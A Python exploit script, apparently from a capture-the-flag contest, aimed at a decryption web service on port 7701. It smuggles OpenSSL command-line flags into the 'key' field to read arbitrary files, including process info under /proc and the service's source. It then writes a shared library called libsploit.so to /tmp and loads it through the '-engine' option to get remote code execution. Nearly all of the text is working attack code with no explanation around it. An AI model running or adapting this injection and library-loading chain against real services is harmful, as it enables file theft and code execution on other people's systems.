#!/usr/bin/env python3.7

import sys
import json
import requests

from Crypto.Cipher import AES as AESCipher


IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = 7701

URL = f'http://{IP}:{PORT}/decrypt'

KEY = 'A0' + '00' * 15
MODE = 'ECB'
AES = AESCipher.new(bytes.fromhex(KEY), mode=AESCipher.MODE_ECB)


def read_file(filename):
    response = requests.post(URL, json={
        'key': f'A -e -in {filename}'.rjust(len(KEY), ' '),
        'mode': MODE,
        'ciphertext': ''
    }).json()
    
    return AES.decrypt(bytes.fromhex(response['result']))


def write_file(data, filename):
    requests.post(URL, json={
        'key': f'A -out {filename}'.rjust(len(KEY), ' '),
        'mode': MODE,
        'ciphertext': AES.encrypt(data).hex()
    }).json()


def get_ppid():
    status = read_file('/proc/self/status')
    for line in status.split(b'\n'):
        if b'PPid' in line:
            return int(line.split(b':')[1].strip().decode())


def get_cmdline(ppid):
    cmdline = read_file(f'/proc/{ppid}/cmdline')
    
    return cmdline.split(b'\x00')


def engine_rce(path):
    response = requests.post(URL, json={
        'key': f'A -engine {path}'.rjust(len(KEY), ' '),
        'mode': MODE,
        'ciphertext': ''
    }).json()

    return response['result']


def main():
    ppid = get_ppid()
    print(f'ppid: {ppid}')
    
    cmdline = get_cmdline(ppid)
    print(f'cmdline: {cmdline}')

    script_name = cmdline[1].decode()
    print(f'script_name: {script_name}')

    source_security = read_file(script_name)
    print(source_security)

    source_libcrypt = read_file('libcrypt.py')
    print(source_libcrypt)

    with open('libsploit.so', 'rb') as file:
        libsploit = file.read()

    path = '/tmp/libsploit.so'
    write_file(libsploit, path)

    print(engine_rce(path))


if __name__ == '__main__':
    main()
